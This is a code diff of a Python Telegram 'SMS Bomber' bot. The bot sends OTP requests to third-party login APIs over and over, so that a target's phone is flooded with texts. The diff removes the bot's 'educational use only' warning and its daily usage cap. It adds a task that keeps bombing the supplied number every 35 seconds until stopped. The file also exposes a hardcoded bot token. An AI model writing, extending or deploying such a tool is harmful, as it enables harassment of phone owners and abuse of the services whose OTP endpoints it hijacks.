@@ -1,17 +1,10 @@
 import requests
 import asyncio
 from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, ContextTypes
 
 BOT_TOKEN = "8181468891:AAEVsNSBv-PC9klp0YqC7ZXpge8Qq_wRpwQ"
 TELEGRAM_GROUP = "https://t.me/+DDVmus7_7u44YjQ1"
-MAX_DAILY_ATTEMPTS = 20
-
-WARNING_MSG = """
-⚠️ EDUCATIONAL USE ONLY ⚠️
-This bot demonstrates API interactions.
-Misuse may violate laws and terms of service.
-"""
 
 SMS_APIS = [
     {
@@ -27,34 +20,20 @@ SMS_APIS = [
         "data": {"contactNumber": "PHONE_NUMBER", "domainId": "2"},
         "headers": {"Content-Type": "application/json"},
         "method": "POST"
-    },
-    {
-        "name": "RummyCircle",
-        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
-        "data": {"isPlaycircle": False, "mobile": "PHONE_NUMBER", "deviceId": "6ebd671c-a5f7-4baa-904b-89d4f898ee79"},
-        "headers": {"Content-Type": "application/json"},
-        "method": "POST"
-    },
-    {
-        "name": "Samsung",
-        "url": "https://www.samsung.com/in/api/v1/sso/otp/init",
-        "data": {"user_id": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/json"},
-        "method": "POST"
     }
 ]
 
+# Store active bombing tasks
+active_bombs = {}
+
 async def start(update, context):
     keyboard = [
-        [InlineKeyboardButton("Join Group", url=TELEGRAM_GROUP)],
-        [InlineKeyboardButton("Acknowledge Warning", callback_data="ack")]
+        [InlineKeyboardButton("Join Group", url=TELEGRAM_GROUP)]
     ]
-    
     await update.message.reply_text(
-        WARNING_MSG + "\n\n"
-        "/bomb [number] - Send SMS\n"
-        "/limit - Check usage\n"
-        f"Daily limit: {MAX_DAILY_ATTEMPTS} attempts",
+        "SMS Bomber Bot\n\n"
+        "/bomb [number] - Start bombing\n"
+        "/stop - Stop bombing",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
@@ -65,60 +44,56 @@ async def bomb(update, context):
 
     phone = context.args[0]
     user_id = update.effective_user.id
-    
-    if 'attempts' not in context.bot_data:
-        context.bot_data['attempts'] = {}
-    
-    user_attempts = context.bot_data['attempts'].get(user_id, 0)
-    
-    if user_attempts >= MAX_DAILY_ATTEMPTS:
-        await update.message.reply_text(f"Daily limit reached ({MAX_DAILY_ATTEMPTS} attempts)")
-        return
 
-    results = []
-    for api in SMS_APIS:
+    # Stop any existing bombing for this user
+    if user_id in active_bombs:
+        active_bombs[user_id].cancel()
+    
+    # Create new bombing task
+    task = asyncio.create_task(continuous_bomb(update, context, phone))
+    active_bombs[user_id] = task
+    
+    await update.message.reply_text(f"🚀 Started bombing {phone} every 35 seconds")
+
+async def continuous_bomb(update, context, phone):
+    count = 0
+    while True:
         try:
-            data = {k: v.replace("PHONE_NUMBER", phone) if isinstance(v, str) else v 
-                   for k, v in api["data"].items()}
+            for api in SMS_APIS:
+                data = {k: v.replace("PHONE_NUMBER", phone) if isinstance(v, str) else v 
+                       for k, v in api["data"].items()}
+                
+                if api["method"] == "POST":
+                    requests.post(api["url"], json=data, headers=api["headers"], timeout=5)
+                else:
+                    requests.get(api["url"], params=data, headers=api["headers"], timeout=5)
             
-            if api["method"] == "POST":
-                r = requests.post(api["url"], json=data, headers=api["headers"], timeout=5)
-            else:
-                r = requests.get(api["url"], params=data, headers=api["headers"], timeout=5)
+            count += 1
+            await update.message.reply_text(f"📤 Sent {count} batches to {phone}")
+            await asyncio.sleep(35)  # Wait 35 seconds between batches
             
-            results.append(f"{'✅' if r.status_code == 200 else '❌'} {api['name']}")
-            await asyncio.sleep(1)
-            
+        except asyncio.CancelledError:
+            await update.message.reply_text("🛑 Bombing stopped")
+            break
         except Exception as e:
-            results.append(f"⚠️ {api['name']} Error")
+            await update.message.reply_text(f"⚠️ Error: {str(e)}")
+            await asyncio.sleep(35)
 
-    context.bot_data['attempts'][user_id] = user_attempts + 1
-    
-    report = "\n".join(results)
-    await update.message.reply_text(
-        f"Report for {phone}\n"
-        f"Attempts used: {user_attempts + 1}/{MAX_DAILY_ATTEMPTS}\n\n"
-        f"{report}\n\n"
-        f"{WARNING_MSG}"
-    )
-
-async def limit(update, context):
+async def stop(update, context):
     user_id = update.effective_user.id
-    attempts = context.bot_data.get('attempts', {}).get(user_id, 0)
-    
-    await update.message.reply_text(
-        f"Your Usage:\n"
-        f"Attempts today: {attempts}\n"
-        f"Remaining: {MAX_DAILY_ATTEMPTS - attempts}\n\n"
-        f"{WARNING_MSG}"
-    )
+    if user_id in active_bombs:
+        active_bombs[user_id].cancel()
+        del active_bombs[user_id]
+        await update.message.reply_text("✅ Stopped bombing")
+    else:
+        await update.message.reply_text("❌ No active bombing to stop")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("bomb", bomb))
-    app.add_handler(CommandHandler("limit", limit))
+    app.add_handler(CommandHandler("stop", stop))
     
     print("Bot is running...")
     app.run_polling()
